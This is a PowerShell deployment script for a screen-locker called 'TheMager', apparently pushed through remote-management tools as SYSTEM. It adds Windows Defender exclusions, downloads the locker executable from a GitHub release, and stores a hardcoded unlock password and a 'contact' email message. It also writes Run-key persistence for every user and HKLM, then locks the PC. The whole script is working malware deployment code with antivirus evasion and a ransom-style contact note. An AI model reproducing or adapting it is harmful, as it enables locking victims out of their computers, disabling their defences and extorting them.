# The Mager - RMM Deploy Script (Fleet Deck / SYSTEM compatible)
# Writes startup to ALL logged-in users via HKEY_USERS when running as SYSTEM
# Usage: deploy_mager.ps1

$ErrorActionPreference = "Continue"

# --- Config ---
$downloadUrl = "https://github.com/spammerbrain101/pc-locker/releases/download/v1.0/TheMager.exe"
$installDir = "$env:TEMP\TheMager"
$exePath = "$installDir\TheMager.exe"
$password = "Olaoluwa@123"
$message = "contact omarjaziz@proton.me"

# --- Step 1: Add Defender exclusion BEFORE downloading ---
Write-Host "[1/5] Adding Windows Defender exclusion..."
try {
    Add-MpPreference -ExclusionPath $installDir -Force 2>$null
    Add-MpPreference -ExclusionProcess "TheMager.exe" -Force 2>$null
    Write-Host "  Defender exclusions added (path + process)"
} catch {
    Write-Host "  WARNING: Could not add Defender exclusion"
}

# --- Step 2: Download ---
Write-Host "[2/5] Downloading TheMager.exe..."
New-Item -ItemType Directory -Path $installDir -Force | Out-Null
$ProgressPreference = 'SilentlyContinue'
Invoke-WebRequest -Uri $downloadUrl -OutFile $exePath -UseBasicParsing
Write-Host "  Downloaded OK"

# --- Step 3: Add file-level exclusion ---
Write-Host "[3/5] Adding file-level AV allow..."
try {
    Add-MpPreference -ExclusionPath $exePath -Force 2>$null
    Write-Host "  File exclusion applied"
} catch {
    Write-Host "  WARNING: File-level exclusion failed"
}

# --- Step 4: Set password and message ---
Write-Host "[4/5] Setting password and message..."
$pwFile = "$env:APPDATA\themager_pw.dat"
$cfgFile = "$installDir\lock_config.json"

$sha256 = [System.Security.Cryptography.SHA256]::Create()
$hashBytes = $sha256.ComputeHash([System.Text.Encoding]::UTF8.GetBytes($password))
$hashHex = [BitConverter]::ToString($hashBytes).Replace("-", "").ToLower()
Set-Content -Path $pwFile -Value $hashHex -Force
Write-Host "  Password hash saved"

$msgJson = "{`"message`":`"$message`"}"
Set-Content -Path $cfgFile -Value $msgJson -Force
Write-Host "  Message: $message"

# --- Step 5: Add startup for ALL logged-in users ---
Write-Host "[5/5] Adding startup entry..."

# When running as SYSTEM, HKCU is SYSTEM's hive (not the real user).
# We must write to HKEY_USERS\{real-user-SID}\...\Run instead.

$hu = [Microsoft.Win32.Registry]::Users
$subKeys = $hu.GetSubKeyNames()
$foundUsers = 0

foreach ($sid in $subKeys) {
    if ($sid -match "_Classes$") { continue }
    if ($sid -eq "S-1-5-18" -or $sid -eq "S-1-5-19" -or $sid -eq "S-1-5-20") { continue }
    if ($sid -notmatch "^S-1-5-21-") { continue }
    
    $username = $sid
    try {
        $acct = New-Object System.Security.Principal.SecurityIdentifier($sid)
        $username = $acct.Translate([System.Security.Principal.NTAccount]).Value
    } catch { }
    
    # Write startup entry
    try {
        $runPath = "$sid\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
        $runKey = $hu.OpenSubKey($runPath, $true)
        if ($runKey) {
            $runKey.SetValue("TheMager", "`"$exePath`"")
            $runKey.Close()
            Write-Host "  Startup OK: $username"
            $foundUsers++
        }
    } catch { }
    
    # Copy password file to user's AppData
    try {
        $envKey = $hu.OpenSubKey("$sid\Environment", $false)
        if ($envKey) {
            $appData = $envKey.GetValue("APPDATA", $null)
            $envKey.Close()
            if ($appData) {
                $userPwFile = Join-Path $appData "themager_pw.dat"
                if (-not (Test-Path $userPwFile)) {
                    Copy-Item $pwFile $userPwFile -Force 2>$null
                }
            }
        }
    } catch { }
}

# Also try HKLM as backup
try {
    $regKey = [Microsoft.Win32.Registry]::LocalMachine.OpenSubKey(
        "SOFTWARE\Microsoft\Windows\CurrentVersion\Run", $true)
    $regKey.SetValue("TheMager", "`"$exePath`"")
    $regKey.Close()
    Write-Host "  HKLM Run: OK (all users fallback)"
    $foundUsers++
} catch { }

if ($foundUsers -eq 0) {
    Write-Host "  WARNING: No startup entries created. May need manual setup."
}

# --- Lock now ---
Write-Host ""
Write-Host "Locking PC..."
Start-Process -FilePath $exePath -ArgumentList "--deploy --password `"$password`" --message `"$message`"" -WindowStyle Normal

Start-Sleep -Seconds 2
Write-Host ""
Write-Host "=== DEPLOY COMPLETE ==="
Write-Host "PC is locked. Unlock with: $password"
